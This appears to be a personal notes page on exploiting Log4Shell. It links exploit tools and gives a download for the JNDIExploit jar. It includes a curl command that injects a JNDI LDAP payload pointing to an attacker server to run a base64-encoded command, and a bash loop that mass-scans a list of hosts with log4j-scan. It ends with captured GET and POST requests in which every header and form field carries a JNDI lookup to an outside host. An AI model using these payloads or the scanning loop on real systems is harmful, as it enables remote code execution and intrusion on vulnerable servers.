I have not looked at this yet tho:
https://github.com/0xInfection/LogMePwn
https://github.com/kozmer/log4j-shell-poc


# nice !
https://www.linkedin.com/feed/update/urn:li:activity:6876536157119897600/?lipi=urn%3Ali%3Apage%3Ad_flagship3_detail_base%3BFs%2Fin2kWRrOJCkVRVwCu9A%3D%3D


JNDIExploit.v1.2.zip JNDIExploit-1.2-SNAPSHOT.jar :
https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip

Pcap:
https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2.pcap


          
    # source (victim)  
    docker rm -f $(docker ps -a -q)  
    sleep 5  
    docker rmi -f $(docker images -q)  
    docker run --name vulnerable-app -p 8080:8080 http://ghcr.io/christophetd/log4shell-vulnerable-app  
   
    #run in a loop (attacker)  
    curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://ATTACKERIP:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'  
         
    # setup jndi:ldap server (attacker)  
    # because Zero Fs given ...  
    killall -9 java  
    wget -U NOTSPAMMER  https://rmccurdy.com/.scripts/downloaded/JNDIExploit.v1.2_RENAMED.zip
    unzip JNDIExploit.v1.2.zip
    java -jar JNDIExploit-1.2-SNAPSHOT.jar -i VICTOM_IP -p 8080  
      
      
    # catch pcap use -w Java_Love_Java.pcap  
    tcpdump -i any -f "port 8080 or port 1389" -qns 0 -A




# log4j-scan 

    killall -9 python3
    killall -9 python3
    killall -9 python3
    
    sleep 2
    # input file of hostnames/path not http or https
    for i in `cat $1`
    do
    echo URL: $i
    
    rm -Rf headers-large_SPLIT*
    # split up the headers into 69 line files
    split -l 69 headers-large.txt headers-large_SPLITa
    
    
    # for each split run http https and https :8080 for each ... maybe add login.jsp too ?? (python seems to follow redirects so you should not need http  or path if server redirects 80 to 443 /SSL 
    for j in `ls headers-large_SPLIT*`
    do
    
    # echo Prepending required Referer  to header file
    sed -i '1s/^/Referer\n/' $j 
    
    
    ./log4j-scan.py -u "http://$i" --headers-file $j  --wait-time 1 --run-all-tests  &
    ./log4j-scan.py -u "https://$i" --headers-file $j --wait-time 1  --run-all-tests &
    ./log4j-scan.py -u "https://$i:8080" --headers-file $j --wait-time 1  --run-all-tests &
    #sleep  .5
    done
    echo Sleeping for next after $i
    sleep 5
    #killall -9 python3
    #killall -9 python3
    done




#Example output

    3 request  total 
    
    1 get
    1 post
    1 post with JSON
    
    tests 70 headers but I set it to do 1000 headers over 17 request ;)
    
    I tried to convert it to curl but I gave up when I relized the last post is JSON ( Ewwww .... )
    
    this is what one looks like with the defalt headers :
    
    
    
    GET /stuff/?v=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D HTTP/1.1
    Host: 162.250.190.93
    User-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Referer: https://${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Api-Version: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Charset: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Datetime: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Language: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Cookie: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-For-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    TE: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    True-Client-IP: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Upgrade: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Via: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Warning: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Max-Forwards: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Origin: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Pragma: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    DNT: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Cache-Control: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-ATT-DeviceId: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Correlation-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Csrf-Token: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-CSRFToken: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Do-Not-Track: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Foo: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Foo-Bar: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-By: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-For-Original: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Host: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Port: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Protocol: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Scheme: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Server: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Ssl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarder-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forward-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forward-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Frame-Options: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Geoip-Country: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Destinationurl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Host-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Method: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-HTTP-Method-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Path-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Https: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Htx-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Hub-Signature: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-If-Unmodified-Since: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Imbo-Test-Config: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Insight: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Ip-Trail: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-ProxyUser-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Requested-With: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Request-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-UIDH: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Wap-Profile: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-XSRF-TOKEN: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    
    
    
    -----------
    
    POST /stuff/?v=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D HTTP/1.1
    Host: 162.250.190.93
    User-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Referer: https://${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Api-Version: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Charset: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Datetime: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Language: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Cookie: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-For-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    TE: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    True-Client-IP: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Upgrade: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Via: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Warning: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Max-Forwards: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Origin: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Pragma: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    DNT: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Cache-Control: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-ATT-DeviceId: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Correlation-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Csrf-Token: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-CSRFToken: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Do-Not-Track: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Foo: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Foo-Bar: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-By: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-For-Original: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Host: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Port: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Protocol: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Scheme: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Server: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Ssl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarder-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forward-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forward-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Frame-Options: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Geoip-Country: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Destinationurl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Host-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Method: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-HTTP-Method-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Path-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Https: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Htx-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Hub-Signature: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-If-Unmodified-Since: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Imbo-Test-Config: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Insight: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Ip-Trail: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-ProxyUser-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Requested-With: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Request-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-UIDH: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Wap-Profile: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-XSRF-TOKEN: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Content-Length: 387
    Content-Type: application/x-www-form-urlencoded
    
    username=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&user=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&email=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&email_address=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D&password=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D
    
    
    ---------
    
    POST /stuff/?v=%24%7Bjndi%3Aldap%3A%2F%2Frmccurdy.com%2Fgfbw2zo%7D HTTP/1.1
    Host: 162.250.190.93
    User-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: close
    Referer: https://${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Api-Version: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Charset: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Datetime: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Accept-Language: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Cookie: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-For-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    TE: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    True-Client-IP: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Upgrade: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Via: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Warning: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Max-Forwards: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Origin: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Pragma: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    DNT: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Cache-Control: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-ATT-DeviceId: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Correlation-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Csrf-Token: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-CSRFToken: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Do-Not-Track: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Foo: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Foo-Bar: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-By: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-For-Original: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Host: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Port: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Protocol: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Scheme: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Server: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarded-Ssl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forwarder-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forward-For: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Forward-Proto: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Frame-Options: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-From: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Geoip-Country: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Destinationurl: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Host-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Method: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-HTTP-Method-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Http-Path-Override: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Https: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Htx-Agent: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Hub-Signature: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-If-Unmodified-Since: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Imbo-Test-Config: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Insight: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Ip-Trail: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-ProxyUser-Ip: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Requested-With: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Request-ID: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-UIDH: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-Wap-Profile: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    X-XSRF-TOKEN: ${jndi:ldap://rmccurdy.com/gfbw2zo}
    Content-Length: 338
    Content-Type: application/json
    
    {"username": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "user": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "email": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "email_address": "${jndi:ldap://rmccurdy.com/gfbw2zo}", "password": "${jndi:ldap://rmccurdy.com/gfbw2zo}"}
